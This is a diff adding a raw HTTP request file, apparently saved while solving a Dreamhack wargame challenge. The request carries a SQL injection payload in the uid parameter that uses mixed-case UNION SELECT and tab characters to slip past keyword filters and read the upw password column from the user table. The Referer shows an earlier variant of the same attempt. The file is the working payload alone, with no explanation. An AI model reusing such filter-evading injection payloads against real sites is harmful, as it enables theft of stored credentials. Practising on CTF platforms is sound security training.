@@ -1,0 +1,11 @@
+GET /?uid=1%27unIon%09sElect%09upw,upw,upw%09From%09user%09wHere%09uid%09!=%27abcde%27;# HTTP/1.1
+Host: host3.dreamhack.games:18953
+Cache-Control: max-age=0
+Accept-Language: ko-KR
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://host3.dreamhack.games:18953/?uid=1%5Cu0027unIon%2509sElect%281%2C2%2C3%29From%2509user%3B%23
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+
